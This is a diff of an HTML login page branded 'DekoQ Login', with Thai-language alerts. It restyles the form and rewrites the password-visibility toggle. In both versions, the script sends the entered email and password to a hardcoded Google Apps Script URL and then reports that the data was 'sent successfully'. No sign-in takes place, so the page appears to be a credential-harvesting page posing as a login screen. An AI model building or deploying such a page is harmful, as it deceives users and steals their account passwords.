@@ -5,10 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>DekoQ Login</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
     body {
       margin: 0;
       padding: 0;
@@ -46,35 +42,27 @@
       max-width: 400px;
     }
 
-    form {
-      display: flex;
-      flex-direction: column;
-      gap: 1.2rem;
-    }
-
     label {
       font-weight: bold;
+      margin-bottom: 0.3rem;
       color: #000;
       text-align: left;
+      display: block;
     }
 
     input[type="email"],
     input[type="password"] {
       width: 100%;
       font-size: 1rem;
-      padding: 0.8rem 1.2rem;
+      padding: 0.8rem 2.5rem 0.8rem 1.2rem;
       border: 1px solid #ccc;
       border-radius: 8px;
-      height: 50px;
+      margin-bottom: 1rem;
+      box-sizing: border-box;
     }
 
     .password-wrapper {
       position: relative;
-      width: 100%;
-    }
-
-    .password-wrapper input {
-      padding-right: 3rem; /* เว้นพื้นที่ให้ไอคอน */
     }
 
     .toggle-password {
@@ -84,16 +72,15 @@
       transform: translateY(-50%);
       background: none;
       border: none;
-      cursor: pointer;
-      width: 24px;
-      height: 24px;
       padding: 0;
+      cursor: pointer;
+      height: 24px;
+      width: 24px;
     }
 
     .toggle-password svg {
-      width: 100%;
-      height: 100%;
-      fill: #555;
+      height: 24px;
+      width: 24px;
     }
 
     button[type="submit"] {
@@ -103,13 +90,9 @@
       color: white;
       border: none;
       font-weight: bold;
+      cursor: pointer;
       font-size: 1rem;
       border-radius: 8px;
-      cursor: pointer;
-    }
-
-    button[type="submit"]:hover {
-      background: #000;
     }
   </style>
 </head>
@@ -121,17 +104,14 @@
     </div>
     <div class="login-box">
       <form id="form">
-        <label for="email">Username / Email</label>
-        <input type="email" id="email" name="email" placeholder="Username / Email" required />
+        <label for="email">Username/Email</label>
+        <input type="email" id="email" name="email" required placeholder="Username or Email" />
 
         <label for="password">Password</label>
         <div class="password-wrapper">
-          <input type="password" id="password" name="password" placeholder="Password" required />
-          <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Toggle password visibility">
-            <svg id="eye-icon" viewBox="0 0 24 24">
-              <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z" stroke="#555" stroke-width="2" fill="none"/>
-              <circle id="pupil" cx="12" cy="12" r="3" fill="#555"/>
-            </svg>
+          <input type="password" id="password" name="password" required placeholder="Password" />
+          <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Toggle Password">
+            <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="#007BFF" viewBox="0 0 24 24"><path d="M12 4.5C7.5 4.5 3.7 7.6 2 12c1.7 4.4 5.5 7.5 10 7.5s8.3-3.1 10-7.5C20.3 7.6 16.5 4.5 12 4.5zm0 12a4.5 4.5 0 1 1 0-9 4.5 4.5 0 0 1 0 9zm0-7.2a2.7 2.7 0 1 0 0 5.4 2.7 2.7 0 0 0 0-5.4z"/></svg>
           </button>
         </div>
 
@@ -142,37 +122,39 @@
 
   <script>
     const form = document.querySelector("#form");
-    const passwordInput = document.getElementById("password");
-    const eyeIcon = document.getElementById("eye-icon");
-    const pupil = document.getElementById("pupil");
-
     const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";
+    const eyeIcon = document.getElementById("eye-icon");
+    let isPasswordVisible = false;
 
     form.addEventListener("submit", (e) => {
       e.preventDefault();
       const email = form.email.value;
-      const password = passwordInput.value;
+      const password = form.password.value;
 
       fetch(scriptURL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email, password }),
       })
-        .then(res => res.text())
-        .then(() => {
+      .then(response => {
+        if (response.ok) {
           alert("ส่งข้อมูลสำเร็จแล้ว!");
           form.reset();
-        })
-        .catch(err => {
+        } else {
           alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
-          console.error(err);
-        });
+        }
+      })
+      .catch(error => {
+        alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
+        console.error("Fetch Error!", error);
+      });
     });
 
     function togglePassword() {
-      const type = passwordInput.type === "password" ? "text" : "password";
-      passwordInput.type = type;
-      pupil.setAttribute("fill", type === "text" ? "#00BFFF" : "#555"); // เปลี่ยนสีลูกตา
+      const pwdInput = document.getElementById("password");
+      isPasswordVisible = !isPasswordVisible;
+      pwdInput.type = isPasswordVisible ? "text" : "password";
+      eyeIcon.setAttribute("fill", isPasswordVisible ? "#FFD700" : "#007BFF");
     }
   </script>
 </body>
